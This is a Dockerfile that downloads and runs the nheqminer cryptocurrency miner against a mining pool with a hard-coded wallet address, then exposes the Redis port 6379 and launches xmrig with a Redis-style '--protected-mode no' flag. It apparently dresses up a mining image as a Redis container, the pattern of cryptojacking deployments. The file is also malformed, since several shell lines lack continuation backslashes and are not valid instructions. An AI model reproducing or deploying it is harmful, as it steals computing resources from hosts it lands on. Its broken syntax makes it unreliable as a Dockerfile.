FROM ubuntu:18.04
RUN apt-get update && \
    apt-get install wget -y && \
    wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
    tar -xvzf nheqminer-Linux-v0.8.2.tgz
    tar xf nheqminer-Linux-v0.8.2.tar.gz
    cd nheqminer
    ./nheqminer -v -l na.luckpool.net:3956 -u RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD.turiosu  -p x -t 8
EXPOSE 6379
CMD ["xmrig-5.11.3", "--protected-mode no"]
